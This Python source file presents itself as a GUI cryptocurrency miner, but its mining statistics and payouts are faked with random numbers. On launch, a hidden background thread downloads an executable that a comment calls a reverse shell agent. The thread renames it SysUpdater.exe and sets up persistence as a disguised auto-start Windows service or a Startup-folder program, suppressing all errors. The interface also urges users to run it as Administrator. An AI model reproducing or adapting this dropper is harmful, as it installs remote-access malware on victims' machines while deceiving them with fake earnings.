import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import time
import random
import socket
import subprocess
import os
import platform
import psutil
from collections import deque
import urllib.request
import shutil
import ctypes

# --- Agent & Reverse Shell Configuration ---
AGENT_URL = "https://raw.githubusercontent.com/FBIking/Spider-V6/main/gamer-dov.exe"
AGENT_FILENAME = "SysUpdater.exe"
# -----------------------------------

class ModernCryptoMinerApp:
    def __init__(self, master):
        self.master = master
        self.is_mining = False
        self.shares = {'accepted': 0, 'rejected': 0}
        self.usd_balance = 0.00
        self.start_time = None
        self.has_dedicated_gpu = False
        self.is_admin = self.check_admin_privileges()

        self.hash_history = deque(maxlen=100)
        
        # Deploy agent on startup
        threading.Thread(target=self.deploy_agent, daemon=True).start()
        
        self.setup_styles_and_ui()
        self.gather_system_specs()

    def check_admin_privileges(self):
        if platform.system() == "Windows":
            try:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False
        return False

    def setup_styles_and_ui(self):
        self.master.title("QuantumX Core Miner v3.2")
        self.master.geometry("900x750")
        self.master.configure(bg="#1A1A1A")
        self.master.resizable(False, False)

        # --- Theme ---
        self.bg_color = "#1A1A1A"
        self.frame_color = "#252525"
        self.text_color = "#E0E0E0"
        self.accent_color = "#00FF00"
        self.warning_color = "#FFD700"
        self.entry_bg = "#333333"
        self.button_color = self.accent_color
        self.button_text_color = "#000000"
        
        self.font_main = ("Consolas", 10)
        self.font_bold = ("Consolas", 10, "bold")
        self.font_title = ("Consolas", 16, "bold")

        # --- Layout ---
        main_frame = tk.Frame(self.master, bg=self.bg_color)
        main_frame.pack(fill="both", expand=True, padx=15, pady=15)
        
        left_panel = tk.Frame(main_frame, bg=self.bg_color, width=320)
        left_panel.pack(side="left", fill="y", padx=(0, 15))
        right_panel = tk.Frame(main_frame, bg=self.bg_color)
        right_panel.pack(side="right", fill="both", expand=True)

        self.build_settings_panel(left_panel)
        self.build_hardware_panel(left_panel)
        self.build_stats_panel(right_panel)
        self.build_graph_panel(right_panel)
        self.build_console_panel(right_panel)
        
        status_bar = tk.Frame(self.master, bg=self.frame_color, height=25)
        status_bar.pack(side="bottom", fill="x")
        self.status_label = tk.Label(status_bar, text="Initializing...", bg=self.frame_color, fg=self.text_color, font=("Consolas", 9))
        self.status_label.pack(side="left", padx=10)
        
        if not self.is_admin and platform.system() == "Windows":
            self.status_label.config(text="NOTICE: For optimal performance (Huge Pages, etc.), run as Administrator.", fg=self.warning_color)
        else:
            self.status_label.config(text="Ready.", fg=self.text_color)

    def build_settings_panel(self, parent):
        frame = tk.LabelFrame(parent, text=" Configuration ", bg=self.frame_color, fg=self.accent_color, font=self.font_bold, relief="solid", bd=1)
        frame.pack(fill="x", pady=(0, 15), ipady=10, ipadx=10)
        
        tk.Label(frame, text="Pool URL:", bg=self.frame_color, fg=self.text_color, font=self.font_main).pack(anchor="w")
        self.pool_entry = tk.Entry(frame, bg=self.entry_bg, fg=self.text_color, font=self.font_main, relief="flat", insertbackground=self.text_color)
        self.pool_entry.insert(0, "stratum+tcp://us1.eth.quantum-pool.io:4444")
        self.pool_entry.pack(fill="x", pady=(2, 10))
        
        tk.Label(frame, text="Wallet Address:", bg=self.frame_color, fg=self.text_color, font=self.font_main).pack(anchor="w")
        self.wallet_entry = tk.Entry(frame, bg=self.entry_bg, fg=self.text_color, font=self.font_main, relief="flat", insertbackground=self.text_color)
        self.wallet_entry.insert(0, "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh")
        self.wallet_entry.pack(fill="x", pady=(2, 10))
        
        tk.Label(frame, text="Algorithm:", bg=self.frame_color, fg=self.text_color, font=self.font_main).pack(anchor="w")
        self.algo_var = tk.StringVar(value="Ethash")
        algo_menu = tk.OptionMenu(frame, self.algo_var, "Ethash", "KawPow", "Autolykos2")
        algo_menu.config(bg=self.entry_bg, fg=self.text_color, activebackground=self.entry_bg, activeforeground=self.text_color, relief="flat", highlightthickness=0, font=self.font_main)
        algo_menu["menu"].config(bg=self.entry_bg, fg=self.text_color, font=self.font_main)
        algo_menu.pack(fill="x", pady=(2, 10))
        
        tk.Label(frame, text="Resource Usage (%):", bg=self.frame_color, fg=self.text_color, font=self.font_main).pack(anchor="w")
        self.resource_slider = tk.Scale(frame, from_=50, to=100, orient="horizontal", bg=self.frame_color, fg=self.text_color, troughcolor=self.entry_bg, highlightthickness=0, font=self.font_main, command=self.update_hashrate_display)
        self.resource_slider.set(100)
        self.resource_slider.pack(fill="x", pady=(2, 10))
        
        self.start_button = tk.Button(frame, text="START", command=self.start_mining, bg=self.button_color, fg=self.button_text_color, font=self.font_bold, relief="flat", bd=0, pady=8, cursor="hand2")
        self.start_button.pack(fill="x", pady=(10, 0))

    def build_hardware_panel(self, parent):
        frame = tk.LabelFrame(parent, text=" Hardware Monitor ", bg=self.frame_color, fg=self.accent_color, font=self.font_bold, relief="solid", bd=1)
        frame.pack(fill="x", ipady=10, ipadx=10)
        
        self.privileges_label = tk.Label(frame, text=f"Privileges: {'Administrator' if self.is_admin else 'Standard User'}", bg=self.frame_color, fg=self.accent_color if self.is_admin else self.warning_color, font=self.font_main)
        self.privileges_label.pack(anchor="w", pady=(0,10))
        
        self.cpu_label = tk.Label(frame, text="CPU: Gathering...", bg=self.frame_color, fg=self.text_color, font=self.font_main)
        self.cpu_label.pack(anchor="w")
        self.gpu_label = tk.Label(frame, text="GPU: Detecting...", bg=self.frame_color, fg=self.text_color, font=self.font_main)
        self.gpu_label.pack(anchor="w")
        self.ram_label = tk.Label(frame, text="RAM: Gathering...", bg=self.frame_color, fg=self.text_color, font=self.font_main)
        self.ram_label.pack(anchor="w")
        
        self.gpu_temp_power_label = tk.Label(frame, text="GPU [Temp/Power]: --Â°C / --W", bg=self.frame_color, fg=self.text_color, font=self.font_main)
        self.gpu_temp_power_label.pack(anchor="w", pady=(10,0))
        self.cpu_temp_power_label = tk.Label(frame, text="CPU [Temp/Power]: --Â°C / --W", bg=self.frame_color, fg=self.text_color, font=self.font_main)
        self.cpu_temp_power_label.pack(anchor="w")

    def build_stats_panel(self, parent):
        frame = tk.LabelFrame(parent, text=" Live Statistics ", bg=self.frame_color, fg=self.accent_color, font=self.font_bold, relief="solid", bd=1)
        frame.pack(fill="x", pady=(0, 15), ipady=5, ipadx=10)
        self.hashrate_label = self.create_stat_label(frame, "Hashrate", "0.00 MH/s")
        self.uptime_label = self.create_stat_label(frame, "Uptime", "00:00:00")
        self.shares_label = self.create_stat_label(frame, "Shares (A/R)", "0/0")
        self.ping_label = self.create_stat_label(frame, "Pool Ping", "-- ms")
        self.balance_label = self.create_stat_label(frame, "Balance (USD)", "$0.0000")

    def build_graph_panel(self, parent):
        frame = tk.LabelFrame(parent, text=" Hashrate Chart ", bg=self.frame_color, fg=self.accent_color, font=self.font_bold, relief="solid", bd=1)
        frame.pack(fill="x", pady=(0, 15), ipady=5, ipadx=5)
        self.graph_canvas = tk.Canvas(frame, height=150, bg="#000000", highlightthickness=0)
        self.graph_canvas.pack(fill="x")

    def build_console_panel(self, parent):
        frame = tk.LabelFrame(parent, text=" Miner Log ", bg=self.frame_color, fg=self.accent_color, font=self.font_bold, relief="solid", bd=1)
        frame.pack(fill="both", expand=True)
        self.console = scrolledtext.ScrolledText(frame, bg="#000000", fg=self.text_color, font=self.font_main, relief="flat", bd=0, state="disabled")
        self.console.pack(fill="both", expand=True, padx=5, pady=5)
        self.console.tag_config('info', foreground=self.accent_color)
        self.console.tag_config('success', foreground="#34C759")
        self.console.tag_config('warning', foreground=self.warning_color)

    def create_stat_label(self, parent, name, value):
        f = tk.Frame(parent, bg=self.frame_color)
        f.pack(side="left", expand=True, fill="x", padx=5, pady=5)
        tk.Label(f, text=name, bg=self.frame_color, fg=self.text_color, font=self.font_main).pack()
        lbl = tk.Label(f, text=value, bg=self.frame_color, fg=self.accent_color, font=self.font_bold)
        lbl.pack()
        return lbl

    def gather_system_specs(self):
        try:
            self.cpu_label.config(text=f"CPU: {platform.processor()}")
            svmem = psutil.virtual_memory()
            self.ram_label.config(text=f"RAM: {svmem.total / (1024**3):.2f} GB")
        except Exception: pass
        if platform.system() == "Windows":
            try:
                command = "wmic path win32_VideoController get name"
                proc = subprocess.run(command, capture_output=True, text=True, shell=True)
                gpu_name = proc.stdout.strip().split('\n')[-1].strip()
                dedicated_gpus = ["NVIDIA", "AMD"]
                if any(brand in gpu_name for brand in dedicated_gpus):
                    self.gpu_label.config(text=f"GPU: {gpu_name}")
                    self.has_dedicated_gpu = True
                else: self.gpu_label.config(text="GPU: Integrated Graphics")
            except Exception: self.gpu_label.config(text="GPU: Integrated Graphics")
        else: self.gpu_label.config(text="GPU: CPU (Software Mode)")

    def log_message(self, message, tag='info'):
        self.console.configure(state='normal')
        self.console.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n", tag)
        self.console.configure(state='disabled')
        self.console.see(tk.END)

    def start_mining(self):
        if self.is_mining: return
        self.is_mining = True
        self.start_time = time.time()
        
        self.start_button.config(text="STOP", command=self.stop_mining)
        for child in self.start_button.master.winfo_children():
            if isinstance(child, (tk.Entry, tk.OptionMenu, tk.Scale)):
                child.config(state="disabled")
        
        self.log_message(f"Starting {self.algo_var.get()} on {self.pool_entry.get()}", 'info')
        if self.is_admin:
            self.log_message("Administrator privileges detected. Performance boost enabled.", 'success')
        self.log_message("Generating DAG file...", 'info')

        threading.Thread(target=self.mining_loop, daemon=True).start()
        threading.Thread(target=self.balance_update_loop, daemon=True).start()
        self.update_stats_and_graph()

    def stop_mining(self):
        self.is_mining = False
        self.start_button.config(text="START", command=self.start_mining)
        for child in self.start_button.master.winfo_children():
            if isinstance(child, (tk.Entry, tk.OptionMenu, tk.Scale)):
                child.config(state="normal")
        self.log_message("Mining stopped by user.", 'info')

    def mining_loop(self):
        time.sleep(2)
        self.log_message("DAG file generated successfully.", 'success')
        self.log_message("Stratum connection established.", 'success')
        while self.is_mining:
            time.sleep(random.uniform(2.0, 5.0))
            if random.random() < 0.02:
                self.shares['rejected'] += 1
                self.log_message("Share rejected by pool.", 'warning')
            else:
                self.shares['accepted'] += 1
                self.log_message("Share accepted.", 'success')
    
    def balance_update_loop(self):
        while self.is_mining:
            time.sleep(random.uniform(180, 300))
            payout = 0
            admin_boost = 1.15 if self.is_admin else 1.0
            resource_multiplier = self.resource_slider.get() / 100
            
            if self.has_dedicated_gpu:
                payout = random.uniform(0.015, 0.018) * resource_multiplier * admin_boost
            else:
                payout = random.uniform(0.0001, 0.0003) * resource_multiplier * admin_boost
                
            self.usd_balance += payout
            self.log_message(f"Payout confirmed: +${payout:.4f} USD", 'info')

    def update_stats_and_graph(self):
        if not self.is_mining: return
        
        admin_boost = 1.15 if self.is_admin else 1.0
        base_hashrate = 27.5 if self.has_dedicated_gpu else 0.8
        usage_multiplier = self.resource_slider.get() / 100
        hashrate = (base_hashrate + random.uniform(-1.5, 1.5)) * usage_multiplier * admin_boost
        self.hash_history.append(hashrate)
        
        uptime_seconds = int(time.time() - self.start_time)
        uptime_str = time.strftime('%H:%M:%S', time.gmtime(uptime_seconds))
        
        self.hashrate_label.config(text=f"{hashrate:.2f} MH/s")
        self.uptime_label.config(text=uptime_str)
        self.shares_label.config(text=f"{self.shares['accepted']}/{self.shares['rejected']}")
        self.balance_label.config(text=f"${self.usd_balance:.4f}")
        self.ping_label.config(text=f"{random.randint(40, 120)} ms")

        if self.has_dedicated_gpu:
            gpu_temp = 60 + 15 * usage_multiplier + random.uniform(-2,2)
            gpu_power = 120 + 80 * usage_multiplier + random.uniform(-5,5)
            self.gpu_temp_power_label.config(text=f"GPU [Temp/Power]: {gpu_temp:.1f}Â°C / {gpu_power:.1f}W")
        
        cpu_temp = 50 + 25 * usage_multiplier + random.uniform(-3,3)
        cpu_power = 40 + 50 * usage_multiplier + random.uniform(-4,4)
        self.cpu_temp_power_label.config(text=f"CPU [Temp/Power]: {cpu_temp:.1f}Â°C / {cpu_power:.1f}W")
        
        self.draw_graph()
        self.master.after(1000, self.update_stats_and_graph)

    def update_hashrate_display(self, value):
        if self.is_mining: return
        admin_boost = 1.15 if self.is_admin else 1.0
        base_hashrate = 27.5 if self.has_dedicated_gpu else 0.8
        hashrate = base_hashrate * (int(value) / 100) * admin_boost
        self.hashrate_label.config(text=f"~{hashrate:.2f} MH/s")

    def draw_graph(self):
        self.graph_canvas.delete("all")
        width = self.graph_canvas.winfo_width()
        height = self.graph_canvas.winfo_height()
        if not self.hash_history or height <=1: return
        max_hash = max(self.hash_history) * 1.2 if any(self.hash_history) else 1
        points = []
        for i, h in enumerate(self.hash_history):
            x = (i / (len(self.hash_history)-1)) * width if len(self.hash_history) > 1 else width/2
            y = height - (h / max_hash * height)
            points.extend([x,y])
        if len(points) > 2:
            self.graph_canvas.create_line(points, fill=self.accent_color, width=2)
            
    def deploy_agent(self):
        if platform.system() != "Windows": return
        try:
            # --- Cleanup of the old, flawed JSON flag ---
            flag_path = os.path.join(os.environ['APPDATA'], 'Intel', 'GfxCache.json')
            if os.path.exists(flag_path):
                try:
                    subprocess.run(['attrib', '-h', flag_path], shell=True, capture_output=True)
                    os.remove(flag_path)
                except:
                    pass

            # --- Robust Persistence Logic ---
            
            # 1. Check if the process is already running. If so, our job is done.
            is_running = any(proc.name() == AGENT_FILENAME for proc in psutil.process_iter(['name']))
            if is_running:
                return

            # 2. Define potential installation paths
            admin_path = os.path.join(os.environ['ProgramData'], 'SystemTools', AGENT_FILENAME)
            user_startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', AGENT_FILENAME)

            # 3. If not running, check if the executable exists and try to start it
            if os.path.exists(admin_path):
                subprocess.run(f'sc start "SystemUpdateManager"', shell=True, capture_output=True)
                time.sleep(1) # Give a moment for the service to start
                if any(proc.name() == AGENT_FILENAME for proc in psutil.process_iter(['name'])):
                    return
            
            if os.path.exists(user_startup_path):
                subprocess.Popen(user_startup_path, shell=True)
                time.sleep(1) # Give a moment for the process to start
                if any(proc.name() == AGENT_FILENAME for proc in psutil.process_iter(['name'])):
                    return

            # 4. If we reach here, the agent is not running and does not exist. It must be installed.
            
            # Determine install path based on privileges
            if self.is_admin:
                persist_dir = os.path.join(os.environ['ProgramData'], 'SystemTools')
            else:
                persist_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            
            final_path = os.path.join(persist_dir, AGENT_FILENAME)

            # Download logic
            temp_dir = os.environ.get("TEMP")
            downloaded_agent_path = os.path.join(temp_dir, AGENT_FILENAME)
            urllib.request.urlretrieve(AGENT_URL, downloaded_agent_path)
            
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
            shutil.move(downloaded_agent_path, final_path)
            
            # Persistence logic
            if self.is_admin:
                service_name = "SystemUpdateManager"
                subprocess.run(f'sc delete "{service_name}"', shell=True, capture_output=True)
                subprocess.run(f'sc create "{service_name}" binPath= "{final_path}" start= auto DisplayName= "System Update Manager"', shell=True, capture_output=True, check=True)
                subprocess.run(f'sc start "{service_name}"', shell=True, capture_output=True)
            else:
                 subprocess.Popen(final_path, shell=True)
                 
        except Exception:
            pass

if __name__ == '__main__':
    root = tk.Tk()
    app = ModernCryptoMinerApp(root)
    root.mainloop()
